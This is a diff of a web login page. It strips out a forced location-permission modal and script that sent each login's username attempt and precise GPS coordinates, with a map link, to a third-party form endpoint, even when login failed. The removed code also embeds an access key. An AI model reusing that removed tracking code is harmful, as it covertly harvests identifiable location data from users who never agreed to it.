@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -46,47 +47,10 @@ button:disabled { background:#a0aec0; cursor:not-allowed; }
 .offline { background:#fefcbf; color:#744210; padding:12px; border-radius:12px; margin-bottom:1rem; display:none; }
 .link { text-align:center; margin-top:1.5rem; }
 .link a { color:#022930; text-decoration:none; font-weight:500; }
-#locationNotice {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.6);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
-}
-#locationNotice div {
-  background:white;
-  padding:2rem;
-  border-radius:16px;
-  max-width:320px;
-  text-align:center;
-  font-family:system-ui;
-}
-#locationNotice button {
-  width:100%;
-  padding:12px;
-  background:#f5576c;
-  color:white;
-  border:none;
-  border-radius:10px;
-  font-weight:600;
-}
 </style>
 </head>
 
 <body>
-<!-- LOCATION NOTICE MODAL -->
-<div id="locationNotice">
-  <div>
-    <h3>Location Required</h3>
-    <p style="font-size:14px;color:#555;margin-bottom:1.5rem;">
-      To continue, please allow system location access.
-    </p>
-    <button id="continueBtn">Continue</button>
-  </div>
-</div>
-
 <div class="card">
   <img src="logon.png" alt="Sigh Looo" class="logon">
   <h1>Login</h1>
@@ -110,30 +74,22 @@ button:disabled { background:#a0aec0; cursor:not-allowed; }
   </form>
 
   <div class="link">
-    <a href="pay.html">
-      Create New Account
-    </a>
+    <a href="pay.html">Create New Account</a>
   </div>
-  <div>
-    <div class="link">
-    <a href="https://www.facebook.com/profile.php?id=61586390903261">
-      Get our help in Fb now ? Click me
+  <div class="link">
+    <a href="https://www.facebook.com/profile.php?id=61586390903261">Get our help in Fb now ? Click me</a>
   </div>
 </div>
 
 <script>
 /* =============== CONFIG =============== */
 const API_BASE = 'https://appp.emxluz.xyz';
-const LOCATION_ENDPOINT = 'https://api.web3forms.com/submit';
-const ACCESS_KEY = 'e9d3714e-a411-470a-a21a-b20934bdc66e';
 
 /* =============== ELEMENTS =============== */
 const form = document.getElementById('loginForm');
 const message = document.getElementById('message');
 const submitBtn = document.getElementById('submitBtn');
 const offlineMessage = document.getElementById('offlineMessage');
-const notice = document.getElementById('locationNotice');
-const continueBtn = document.getElementById('continueBtn');
 
 /* =============== ONLINE CHECK =============== */
 function checkOnline() {
@@ -143,90 +99,44 @@ checkOnline();
 window.addEventListener('online', checkOnline);
 window.addEventListener('offline', checkOnline);
 
-/* =============== FORM SUBMIT =============== */
-form.addEventListener('submit', (e) => {
+/* =============== FORM SUBMIT (DIRECT LOGIN) =============== */
+form.addEventListener('submit', async (e) => {
   e.preventDefault();
   message.innerHTML = '';
   if (!navigator.onLine) {
     message.innerHTML = '<div class="error">You are offline.</div>';
     return;
   }
-  if (!navigator.geolocation) {
-    message.innerHTML = '<div class="error">Location not supported.</div>';
-    return;
-  }
-  // Show custom modal first
-  notice.style.display = 'flex';
-});
 
-/* =============== CONTINUE BUTTON (TRIGGERS LOCATION) =============== */
-continueBtn.addEventListener('click', () => {
-  notice.style.display = 'none';
-  submitBtn.disabled = true;
-  submitBtn.textContent = 'Requesting Location...';
-
-  navigator.geolocation.getCurrentPosition(
-    position => handleLocation(position),
-    () => {
-      submitBtn.disabled = false;
-      submitBtn.textContent = 'Login';
-      message.innerHTML =
-        '<div class="error">You must allow location access to continue.</div>';
-    },
-    { enableHighAccuracy:true, timeout:10000 }
-  );
-});
-
-/* =============== SEND LOCATION & LOGIN =============== */
-function handleLocation(position){
   const formData = Object.fromEntries(new FormData(form));
-
-  // Send location immediately (even if login fails)
-  fetch(LOCATION_ENDPOINT, {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      access_key: ACCESS_KEY,
-      username_attempt: formData.username,
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      time: new Date().toISOString(),
-      map:`https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
-    })
-  });
-
-  // Attempt login after sending location
-  loginAttempt(formData);
-}
-
-async function loginAttempt(data){
+  submitBtn.disabled = true;
   submitBtn.textContent = 'Logging in...';
-  try{
-    const res = await fetch(`${API_BASE}/api/login`,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({username:data.username,password:data.password})
+
+  try {
+    const res = await fetch(`${API_BASE}/api/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: formData.username, password: formData.password })
     });
     const result = await res.json();
-    if(res.ok && result.success){
+    if (res.ok && result.success) {
       sessionStorage.setItem('username', result.username);
       sessionStorage.setItem('userId', result.userId);
       message.innerHTML = '<div class="success">Login successful</div>';
-      setTimeout(()=>location.href='kopen.html',1200);
+      setTimeout(() => location.href = 'kopen.html', 1200);
     } else {
       message.innerHTML = `<div class="error">${result.error || 'Invalid login details'}</div>`;
     }
-  }catch{
-    message.innerHTML='<div class="error">Cannot connect to server.</div>';
-  }finally{
+  } catch {
+    message.innerHTML = '<div class="error">Cannot connect to server.</div>';
+  } finally {
     submitBtn.disabled = false;
     submitBtn.textContent = 'Login';
   }
-}
+});
 
 /* =============== PWA SERVICE WORKER =============== */
-if('serviceWorker' in navigator){
+if ('serviceWorker' in navigator) {
   navigator.serviceWorker.register('/sw.js');
 }
 </script>
